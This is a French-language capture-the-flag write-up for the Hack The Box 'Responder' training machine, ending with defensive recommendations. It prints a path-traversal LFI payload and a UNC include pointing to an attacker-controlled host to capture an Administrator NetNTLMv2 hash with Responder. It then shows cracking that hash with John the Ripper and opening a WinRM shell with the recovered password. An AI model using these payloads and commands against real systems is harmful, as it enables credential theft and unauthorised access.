# HTB — Responder (Starting Point)

**Difficulté :** Very Easy
**OS :** Windows
**Catégorie :** Starting Point
**Cible :** 10.129.36.56

## Résumé

Cette machine illustre une attaque classique de capture d'identifiants **NTLM via Responder**, déclenchée par une vulnérabilité de **Local/Remote File Inclusion (LFI)** sur un site web PHP. L'inclusion d'une ressource SMB hébergée sur la machine attaquante force le serveur cible à s'authentifier, ce qui permet de capturer un hash NetNTLMv2. Une fois ce hash cassé hors-ligne avec John the Ripper, les identifiants obtenus donnent un accès **WinRM** complet sur la machine.

## 1. Reconnaissance / Scan de ports

```bash
nmap -p- --min-rate 1000 -sV 10.129.36.56
```

Résultat :

```
PORT     STATE SERVICE     VERSION
80/tcp   open  http        Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
5985/tcp open  http        Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: OS: Windows
```

Deux ports intéressants :
- **80/tcp** : serveur web Apache/PHP sur une machine Windows
- **5985/tcp** : **WinRM** (Windows Remote Management) — si des identifiants valides sont trouvés, cela permettra d'obtenir un shell PowerShell distant

## 2. Découverte du virtual hosting

En accédant à `http://10.129.36.56/`, le navigateur redirige vers un nom de domaine (le serveur utilise le **Name-Based Virtual Hosting**, qui route les requêtes selon l'en-tête `Host`). Il faut donc ajouter une entrée dans `/etc/hosts` :

```bash
echo "10.129.36.56   unika.htb" | sudo tee -a /etc/hosts
```

Le site est une vitrine d'entreprise de design web, avec une option de changement de langue (EN/FR) qui charge dynamiquement des pages via un paramètre d'URL :

```
http://unika.htb/index.php?page=french.html
```

## 3. Vulnérabilité LFI (Local File Inclusion)

Le paramètre `page` est utilisé côté serveur avec la fonction PHP `include()` sans sanitation. Il est donc possible de remonter l'arborescence pour lire des fichiers système :

```
http://unika.htb/index.php?page=../../../../../../../windows/system32/drivers/etc/hosts
```

Le contenu du fichier `hosts` de Windows s'affiche dans la réponse, confirmant la LFI.

**Pourquoi ça marche :** le backend fait `include($_GET['page'])`. Sans filtrage, on contrôle entièrement le chemin inclus, ce qui permet de lire n'importe quel fichier accessible au compte du serveur web.

## 4. De la LFI au vol de hash NTLM via Responder

Même lorsque `allow_url_include` est désactivé dans `php.ini` (ce qui bloque l'inclusion de fichiers distants en HTTP/FTP), PHP sous Windows continue de résoudre les chemins **UNC/SMB** (`\\IP\partage\fichier`). En pointant le paramètre `page` vers une ressource SMB hébergée sur notre machine, le serveur Windows tente de s'authentifier auprès de nous — exactement ce que **Responder** est conçu pour intercepter.

### Lancement de Responder

```bash
sudo python3 Responder.py -I <interface_vpn>
```

### Déclenchement de l'authentification via la LFI

```
http://unika.htb/?page=//<IP_attaquant>/fichier_quelconque
```

Le navigateur affiche une erreur d'inclusion (fichier introuvable), mais côté Responder, la capture a fonctionné :

```
[SMB] NTLMv2-SSP Client   : 10.129.36.56
[SMB] NTLMv2-SSP Username : DESKTOP-H30F232\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::DESKTOP-H30F232:...
```

Le serveur IIS/Apache tente de résoudre le chemin UNC comme un partage réseau, envoie une requête d'authentification SMB vers notre machine, et Responder répond au challenge NTLM pour capturer le hash **NetNTLMv2** du compte `Administrator`.

## 5. Cassage du hash avec John the Ripper

Le hash est sauvegardé dans un fichier (`hash.txt`) au format `user::domain:challenge:HMAC:blob`, puis cassé hors-ligne :

```bash
john -w=/usr/share/wordlists/rockyou.txt hash.txt
```

Résultat :

```
badminton (Administrator)
```

**Identifiants obtenus :** `Administrator` / `badminton`

## 6. Accès WinRM

Avec ces identifiants valides et le port **5985** ouvert, une session WinRM est établie (ici via un script Python utilisant `pywinrm`, équivalent à `evil-winrm`) :

```python
import winrm
session = winrm.Session('10.129.36.56', auth=('Administrator', 'badminton'))
r = session.run_ps("whoami")
```

```
PS> Get-ChildItem C:\Users
Administrator
mike
Public
```

## 7. Récupération du flag

Le flag n'est pas sur le bureau d'`Administrator`, mais sur celui de l'autre utilisateur local, `mike` :

```
PS> Get-ChildItem C:\Users\mike\Desktop -Force
flag.txt   32 bytes

PS> Get-Content C:\Users\mike\Desktop\flag.txt
ea81b7afddd03efaa0945333ed147fac
```

## Conclusion

Cette machine enchaîne deux faiblesses courantes :

1. **Une LFI non filtrée** sur un paramètre d'inclusion PHP, qui à elle seule semble peu exploitable (pas d'exécution de code directe).
2. **La capacité de PHP/Windows à résoudre des chemins UNC**, qui transforme cette LFI en vecteur de **vol d'identifiants NTLM** via Responder — sans jamais exécuter de code sur la cible.

Le hash NetNTLMv2 capturé n'est pas réversible directement, mais reste cassable hors-ligne si le mot de passe est faible (ici présent dans `rockyou.txt`). Une fois les identifiants Administrator obtenus, le service **WinRM** exposé donne un accès shell complet.

**Recommandations défensives :**
- Valider/filtrer strictement les entrées utilisateur utilisées dans des fonctions d'inclusion (`include`, `require`), idéalement via une liste blanche de fichiers autorisés.
- Bloquer en sortie le trafic SMB (445) et WebDAV vers des IP externes/arbitraires depuis le serveur web.
- Imposer des mots de passe robustes, en particulier sur les comptes à privilèges comme `Administrator`.
- Restreindre l'accès WinRM (5985/5986) aux seules IP d'administration légitimes.

## Résumé des commandes

| Étape | Commande |
|---|---|
| Scan de ports/versions | `nmap -p- --min-rate 1000 -sV <IP>` |
| Résolution du vhost | `echo "<IP> unika.htb" \| sudo tee -a /etc/hosts` |
| Test LFI | `http://unika.htb/index.php?page=../../../../windows/system32/drivers/etc/hosts` |
| Lancer Responder | `sudo python3 Responder.py -I <interface>` |
| Déclencher l'auth NTLM via LFI | `http://unika.htb/?page=//<IP_attaquant>/fichier` |
| Casser le hash | `john -w=/usr/share/wordlists/rockyou.txt hash.txt` |
| Connexion WinRM | `evil-winrm -i <IP> -u administrator -p <mdp>` (ou `pywinrm`) |
| Récupérer le flag | `Get-Content C:\Users\mike\Desktop\flag.txt` |
